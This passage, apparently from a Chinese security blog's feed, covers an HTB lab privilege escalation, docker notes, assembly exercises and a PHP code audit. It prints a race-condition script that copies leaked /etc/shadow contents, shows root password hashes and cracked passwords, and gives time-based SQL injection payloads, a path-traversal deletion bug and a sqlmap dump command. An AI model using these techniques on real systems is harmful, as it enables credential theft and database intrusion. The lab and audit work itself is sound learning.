open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:        f.write(passwordFile)    time.sleep(.1)    salt = &quot;&quot;    realPass = &quot;&quot;    for p in passwords:        if p[0] == session[&#39;user&#39;]:            salt, realPass = p[1].split(&#39;$&#39;)[2:]            break    if salt == &quot;&quot;:        print(&quot;Invalid user&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    salt = &#39;$6$&#39;+salt+&#39;$&#39;    realPass = salt + realPass    hash = crypt.crypt(passW, salt)    if hash == realPass:        print(&quot;Authed!&quot;)        session[&#39;authenticated&#39;] = 1    else:        print(&quot;Incorrect pass&quot;)        os.remove(&#39;/tmp/SSH/&#39;+path)        sys.exit(0)    os.remove(os.path.join(&#39;/tmp/SSH/&#39;,path))except Exception as e:    traceback.print_exc()    sys.exit(0)if session[&#39;authenticated&#39;] == 1:    while True:        command = input(session[&#39;user&#39;] + &quot;@Obscure$ &quot;)        cmd = [&#39;sudo&#39;, &#39;-u&#39;,  session[&#39;user&#39;]]        cmd.extend(command.split(&quot; &quot;))        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        o,e = proc.communicate()        print(&#39;Output: &#39; + o.decode(&#39;ascii&#39;))        print(&#39;Error: &#39;  + e.decode(&#39;ascii&#39;)) if len(e.decode(&#39;ascii&#39;)) &gt; 0 else print(&#39;&#39;)</code></pre><p><code>SuperSecureCrypt.py</code></p><pre><code class="python">www-data@obscure:/home/robert$ cat SuperSecureCrypt.pycat SuperSecureCrypt.pyimport sysimport argparsedef encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypteddef decrypt(text, key):    keylen = len(key)    keyPos = 0    decrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr - ord(keyChr)) % 255)        decrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return decryptedparser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)parser.add_argument(&#39;-i&#39;,                    metavar=&#39;InFile&#39;,                    type=str,                    help=&#39;The file to read&#39;,                    required=False)parser.add_argument(&#39;-o&#39;,                    metavar=&#39;OutFile&#39;,                    type=str,                    help=&#39;Where to output the encrypted/decrypted file&#39;,                    required=False)parser.add_argument(&#39;-k&#39;,                    metavar=&#39;Key&#39;,                    type=str,                    help=&#39;Key to use&#39;,                    required=False)parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)args = parser.parse_args()banner = &quot;################################\n&quot;banner+= &quot;#           BEGINNING          #\n&quot;banner+= &quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;banner+= &quot;################################\n&quot;banner += &quot;  ############################\n&quot;banner += &quot;  #        FILE MODE         #\n&quot;banner += &quot;  ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None:    print(&quot;Missing args&quot;)else:    if args.d:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Decrypting...&quot;)        decrypted = decrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(decrypted)    else:        print(&quot;Opening file {0}...&quot;.format(args.i))        with open(args.i, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:            data = f.read()        print(&quot;Encrypting...&quot;)        encrypted = encrypt(data, args.k)        print(&quot;Writing to {0}...&quot;.format(args.o))        with open(args.o, &#39;w&#39;, encoding=&#39;UTF-8&#39;) as f:            f.write(encrypted)</code></pre><p>从加密的脚本中可以知道关键的加密逻辑：</p><pre><code class="python">def encrypt(text, key):    keylen = len(key)    keyPos = 0    encrypted = &quot;&quot;    for x in text:        keyChr = key[keyPos]        newChr = ord(x)        newChr = chr((newChr + ord(keyChr)) % 255)        encrypted += newChr        keyPos += 1        keyPos = keyPos % keylen    return encrypted</code></pre><p>所以我们只需要爆破密钥了</p><p>爆破脚本</p><pre><code class="python">import stringwith open(&#39;check.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    ta = f.read()key=&#39;&#39;with open(&#39;out.txt&#39;,&#39;r&#39;,encoding=&#39;UTF-8&#39;) as f:    data = f.read()    for x in range(len(data)):        for i in range(255):            ch = chr((ord(data[x])-i)%255)            if ch == ta[x]:                key +=chr(i)                break    print(key)</code></pre><p>得到密钥</p><pre><code>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal</code></pre><blockquote><p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p></blockquote><p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p><pre><code>robert@obscure:~$ xxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................000000b0: c38c c397 c289 c281 76                   ........v</code></pre><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p><pre><code class="bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -dk alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d#################################           BEGINNING          ##    SUPER SECURE ENCRYPTOR    #################################  ############################  #        FILE MODE         #  ############################Opening file passwordreminder.txt...Decrypting...Writing to /tmp/key.txt...www-data@obscure:/home/robert$ cat /tmp/key.txtcat /tmp/key.txtSecThruObsFTW</code></pre><p>成功登陆</p><p>拿到 flag</p><pre><code class="bash">robert@obscure:~$ lsBetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txtrobert@obscure:~$ cat user.txte4493782066b55fe2755708736ada2d7</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p><pre><code class="bash">robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser robert may run the following commands on obscure:    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></pre><p>审计源码发现关键点：</p><pre><code class="python">with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:    data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data:    if not x == None:        passwords.append(x)passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:    f.write(passwordFile)</code></pre><p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p><pre><code class="python">import shutilimport oswhile True:    files = os.listdir(&quot;./SSH&quot;)    for file in files:        shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;);</code></pre><p>或者使用 <code>shell</code> 脚本</p><pre><code class="shell">robert@obscure:/tmp$ cat scandir.sh#/bin/bashpath=$1while (true); do    file=$(ls $path)    if [ &quot;${file}&quot; == &quot;&quot; ]    then        continue    else        mv $path/$file ./        break    fidone</code></pre><p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p><pre><code class="python">robert@obscure:/tmp/flag$ lsTdrs5183robert@obscure:/tmp/flag$ cat Tdrs5183root$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1182260999997robert$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/181630999997</code></pre><p>john 解密得到 <code>mercedes</code></p><pre><code class="bash">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.pyEnter username: rootEnter password: mercedesAuthed!root@Obscure$ lsOutput: SSHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtHsystemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWivmware-root_574-2990744286root@Obscure$ cat /root/root.txtOutput: 512fd4429f33a113a44d5acde23609e3</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本使用指南</title>
      <link href="/posts/70b2e753/"/>
      <url>/posts/70b2e753/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-遇到的坑"><a href="#docker-遇到的坑" class="headerlink" title="docker 遇到的坑"></a>docker 遇到的坑</h2><p>运行的时候不能直接用 <code>./</code> 指定当前的文件，需要 <code>$PWD</code></p><p>一次性清理所有的已经关闭的容器<br> <code>docker ps -a | grep Exit | cut -d &#39; &#39; -f 1 | xargs docker rm</code></p><p><code>:ro</code> 表示只读</p><p>访问受到限制</p><p><img src="/posts/70b2e753/1580653426115.png" alt></p><p>此时目录下的文件权限</p><p><img src="/posts/70b2e753/1580653436093.png" alt></p><p>重新运行了一下</p><p><img src="/posts/70b2e753/1580653447982.png" alt></p><p>看来是文件权限的问题，也就是说docker会默认将文件权限直接复制过来，由于我之前的那个用户是pxy，而docker环境中并没有这个用户，导致就变成了1000</p><h2 id="移除镜像"><a href="#移除镜像" class="headerlink" title="移除镜像"></a>移除镜像</h2><pre><code>docker image rm xxxx</code></pre><h2 id="–link-参数"><a href="#–link-参数" class="headerlink" title="–link 参数"></a>–link 参数</h2><p>自动添加了环境变量</p><p><img src="/posts/70b2e753/1580653523204.png" alt></p><p><img src="/posts/70b2e753/1580653527989.png" alt></p><p>还有这个</p><p><img src="/posts/70b2e753/1580653537486.png" alt></p><p><code>/etc/hosts</code> 也会更新</p><p><img src="/posts/70b2e753/1580653546884.png" alt></p><p>神奇。。<br>运行nginx和php-fpm<br><code>docker run --name  myphp-fpm -v $PWD/www:/www  -d php:5.6-fpm</code></p><pre><code>$ docker run --name runoob-php-nginx -p 8083:80 -d \               -v $PWD/www:/usr/share/nginx/html:ro \    -v $PWD/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \ ----&gt; 注意需要取别名nginx</code></pre><p>如果不取别名的话直接闪退，别名可以理解成对应的主机地址</p><p><img src="/posts/70b2e753/1580653561167.png" alt></p><p>然后开始折腾docker-compose.yml</p><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php:5.6-fpm    volumes:      - ./www:/www</code></pre><p>试了多次，<code>links</code> 需要取别名</p><p>同时文件的权限也很重要，不然会出现无法读取flag的情况</p><h2 id="Dockerfile-编写"><a href="#Dockerfile-编写" class="headerlink" title="Dockerfile 编写"></a>Dockerfile 编写</h2><p><code>WORKDIR</code> 指定工作目录，这样就能够在执行一些shell命令的时候不需要指明路径了</p><h2 id="docker无法运行-mysql容器"><a href="#docker无法运行-mysql容器" class="headerlink" title="docker无法运行 mysql容器"></a>docker无法运行 mysql容器</h2><p>这是由于我偷懒只在本机安装了 mysql 得客户端，没有安装服务端，这也是很神奇了</p><h2 id="docker运行phpmyadmin"><a href="#docker运行phpmyadmin" class="headerlink" title="docker运行phpmyadmin"></a>docker运行phpmyadmin</h2><p>我发现并不需要 nginx ,当然如果有nginx的情况下可以做到反向代理比较好一点</p><pre><code class="yaml">version: &quot;3&quot;services:  phpmyadmin:    image: phpmyadmin/phpmyadmin    ports:       - 8081:80    links:      - mysql:db  mysql:    image: mysql:5.6    environment:       - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx结合mysql"><a href="#nginx结合mysql" class="headerlink" title="nginx结合mysql"></a>nginx结合mysql</h2><pre><code class="yaml">version: &#39;2&#39;services:  nginx:    image: nginx:latest    volumes:      - ./conf/conf.d:/etc/nginx/conf.d      - ./www:/usr/share/nginx/html    depends_on:      - myphp-fpm    links:      - myphp-fpm:php    ports:      - &quot;8083:80&quot;  myphp-fpm:    image: php/kuozhan    volumes:      - ./www:/www    links:      - mysql:db  mysql:    image: mysql:5.6    restart: always    environment:      - MYSQL_ROOT_PASSWORD=123456</code></pre><h2 id="nginx配置学习"><a href="#nginx配置学习" class="headerlink" title="nginx配置学习"></a>nginx配置学习</h2><p>nginx的配置文件以后再单独写，这里先学一点</p><p>怎么理解 nginx和php-fpm的关系呢</p><p>我在配置docker环境的时候意识到nginx和php两个镜像是相互独立的，首先运行php-fpm镜像，将其内部的 <code>/www</code> 映射到我外部的 <code>./www</code> 目录中，然后再运行 nginx 镜像，将其 <code>/usr/share/nginx/html</code> 映射到 <code>./www</code> 目录，同时还需要做两件事</p><ol><li>配置nginx，指定解析的脚本目在 <code>/www</code> 目录中</li><li>连接php-fpm容器，需要将解析到 php 这个域名才行</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土二</title>
      <link href="/posts/6cc1a5d6/"/>
      <url>/posts/6cc1a5d6/</url>
      
        <content type="html"><![CDATA[<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>intel的CPU是采用的小端法来存储数据</p><p>在查看内存的时候，我更愿意按照这样的方式，我认为0号应该代表第一根横线，也就是认为是第一个存储单元的开始，也就是说我觉得 0~1 这个单元存放着 20H，因为这样在后续分析栈的时候比较有用</p><p><img src="/posts/6cc1a5d6/1580653048875.png" alt></p><p>字单元：存放一个字节型数据的内存单元，也就是两个字节16位，高位放高地址，低位放低地址</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>数据段寄存器默认为 ds</p><p>所以我们要操作内存数据的时候只需要指定偏移即可</p><p>CPU不支持直接将数据送入到段寄存器，需要有寄存器作为中转</p><pre><code class="x86asm">mov bx,1000Hmov ds,bxmov [0],al</code></pre><p>上述代码的含义：先设置ds寄存器为1000H，然后将al中的数据送往这个内存单元(所以我们要移动数据到内存的时候是需要先设置数据段的基地址的)</p><h2 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h2><p>mov 段寄存器，寄存器<br>mov 寄存器，段寄存器<br>mov 内存单元，寄存器<br>mov 寄存器，内存单元<br>mov 段寄存器，内存单元<br>mov 内存单元，段寄存器</p><p>但是 add 指令不能直接操作段寄存器和寄存器</p><p><img src="/posts/6cc1a5d6/1580653072050.png" alt></p><h2 id="数据段-1"><a href="#数据段-1" class="headerlink" title="数据段"></a>数据段</h2><p><img src="/posts/6cc1a5d6/1580653090896.png" alt></p><p>AX=0，BX=0</p><pre><code>mov ax,1mov ds,axmov ax,[0000] ;AX = 2662Hmov bx,[0001] ;BX = E626Hmov ax,bx     ;AX = 2662Hmov ax,[0000] ;AX = 2662Hmov bx,[0002] ;BX = D6E6Hadd ax,bx     ;AX = FD48Hadd ax,[0004] ;AX = 2ECC+FD48 = 2C14mov ax,0      ;AX = 0mov al,[0002] ;AX = E6Hmov bx,0      ;BX = 0mov bl,[000c] ;BX = 00Hadd al,bl     ;AX = E6H</code></pre><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>任意时刻 <code>SS:SP</code> 指向栈顶元素</p><p>PUSH 操作的过程</p><ol><li>SP = SP -2</li><li>SS:SP 指向新的地址</li><li>然后将数据送入到 <code>SS:SP</code> 指向的地址中</li></ol><p>然后就涉及到怎么计算 <code>SP</code> 的问题了</p><blockquote><p>只需要记住初始状态栈中没有元素，并且 SP+2 是栈中的第一个存储单元</p></blockquote><p><img src="/posts/6cc1a5d6/1580653127959.png" alt></p><p>POP 指令</p><ol><li>将SS:SP 指向的内存单元数据送入到寄存器中，或者是某个内存单元中</li><li>SP = SP + 2</li></ol><p>PUSH和POP的指令形式</p><pre><code>push 寄存器pop 寄存器push 段寄存器pop 段寄存器push 内存单元pop 内存单元</code></pre><p>利用栈可以达到交换数据的目的</p><pre><code>mov ax,1000Hmov ss,axmov sp,0010Hmov ax,001AHmov bx,001BHpush axpush bxpop axpop bx</code></pre><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p><img src="/posts/6cc1a5d6/1580653176153.png" alt></p><pre><code class="x86asm">mov ax,1000Hmov ds,axmov ax,2000mov ss,axmov sp,0010Hpush[0]push[2]push[4]push[6]push[8]push[A]push[C]push[E]</code></pre><p>现在 1000H~100FH 的内存内容为：</p><p><img src="/posts/6cc1a5d6/1580653193364.png" alt></p><p>本着节约内存的想法</p><p><img src="/posts/6cc1a5d6/1580653210499.png" alt></p><p>然而执行完之后的结果</p><p><img src="/posts/6cc1a5d6/1580653219446.png" alt></p><p>看来节约内存不是件好事，于是我重新把 3000:0 作为代码段</p><p><img src="/posts/6cc1a5d6/1580653228997.png" alt></p><p>这回成功了</p><p><img src="/posts/6cc1a5d6/1580653238046.png" alt></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p><img src="/posts/6cc1a5d6/1580653248493.png" alt></p><pre><code class="x86asm">mov ax,2000Hmov ds,axmov ax,1000Hmov ss,axmov sp,0pop [E]pop [C]pop [A]pop [8]pop [6]pop [4]pop [2]pop [0]</code></pre><p>同样的，我先设置 1000:0 处的值</p><p><img src="/posts/6cc1a5d6/1580653258074.png" alt></p><p>将指令书写到内存中，也就是设置 3000:0 为代码段</p><p><img src="/posts/6cc1a5d6/1580653266322.png" alt></p><p>在实验的时候，前面一部分数据是可以正常复制的，但是后面就出问题了</p><p><img src="/posts/6cc1a5d6/1580653275496.png" alt></p><p>暂时没想清楚</p><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><p>遇到的问题</p><p>输入指令：</p><p><img src="/posts/6cc1a5d6/1580653286041.png" alt></p><p>但是在执行的时候：</p><p><img src="/posts/6cc1a5d6/1580653293057.png" alt></p><p>这是之后要研究的内容；中断机制<br>Debug的T命令在修改寄存器SS的指令时，下一条指令也会紧接着执行</p><pre><code class="x86asm">mov ax,ffffmov ds,axmov ax,2200mov ss,axmov sp,0100mov ax,[0]     ;ax=C0EAHadd ax,[2]     ;ax=C0FCHmov bx,[4]     ;bx=30Fadd bx,[6]     ;bx=6021Hpush ax        ;sp=FEH,修改的内存单元地址是220FEH,内容为C0FCHpush bx        ;sp=FCH,修改的内存单元地址是220FCH,内容为6021Hpop ax           ;sp=FEH,ax=6021Hpop bx           ;sp=100H,bx=C0FCHpush [4]       ;sp=FEH,修改的内存单元是220FEH,内容为30F0push [6]       ;sp=FCH,修改的内存单元是220FCH,内容为2F31</code></pre><p><img src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><pre><code class="x86asm">mov ax,2add ax,axadd ax,axadd ax,ax</code></pre><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><pre><code>[autoexec]# Lines in this section will be run at startup.# You can put your MOUNT lines here.mount C: G:\MASMC:</code></pre><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><pre><code class="x86asm">mov ax,1add ax,axjmp 2000:0003</code></pre><p>运行过程截图</p><p><img src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><pre><code class="php">function del_file(){    $path = post(&#39;path&#39;);    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);    $dir[0] = &#39;data/backup/&#39;;    $dir[1] = &#39;images/&#39;;    $dir[2] = &#39;resource/&#39;;    $flag = false;    for($i = 0; $i &lt; count($dir); $i ++)    {        if(substr($path,0,strlen($dir[$i])) == $dir[$i])        {            $flag = true;        }    }    if($flag)    {        if(unlink($path))        {            $result = 1;        }    }    echo isset($result) ? $result : 0;}</code></pre><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) # 延时 表明当前数据库长度为 6 cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) # 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) # 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);    $obj = new goods();    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);    $obj-&gt;set_where(&#39;goo_channel_id = &#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre><p>这里忘记过滤了</p><pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre><p><img 